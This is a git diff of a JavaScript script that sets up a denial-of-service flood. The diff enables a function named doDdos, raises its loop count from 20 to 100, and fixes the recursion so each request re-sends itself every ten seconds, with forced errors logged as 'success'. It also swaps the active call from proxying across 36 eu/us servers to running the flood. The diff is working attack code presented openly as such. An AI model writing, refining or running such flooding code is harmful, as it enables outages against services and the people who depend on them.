@@ -51,11 +51,11 @@ const recurRequest2 = (request) => {
 		let errType = parseErr(err)
 		if (errType == ERRORS.FORCED_ERR) {
 			console.log("success 2");
-			setTimeout(() => {recurRequest(request)}, 10000)
+			setTimeout(() => {recurRequest2(request)}, 10000)
 		}
 		else {
-			console.log({err})
-			setTimeout(() => {recurRequest( request)}, 10000)
+			console.log('er')
+			setTimeout(() => {recurRequest2( request)}, 10000)
 		}
 	})
 
@@ -68,15 +68,22 @@ const doDdos = () => {
 		try{
 			REQUESTS2.forEach((request) => {
 				recurRequest2(request)
-			})
+			});
+			 i++;
 		} catch (err)
 		{ console.log('errrrr ', err) }
-	} while (i<20);
+	} while (i<100);
+}
+
+const doTest = () => {
+	REQUESTS2.forEach((request) => {
+		recurRequest2(request)
+	});
 }
 servers = []
 for (let i = 1; i <= 18; i++) servers.push(`eu${i}`) 
 for (let i = 1; i <= 18; i++) servers.push(`us${i}`)
 
-//doDdos();
-servers.forEach((server) => doProxy(server))
+doDdos();
+//servers.forEach((server) => doProxy(server))
 //doProxy(servers[0])
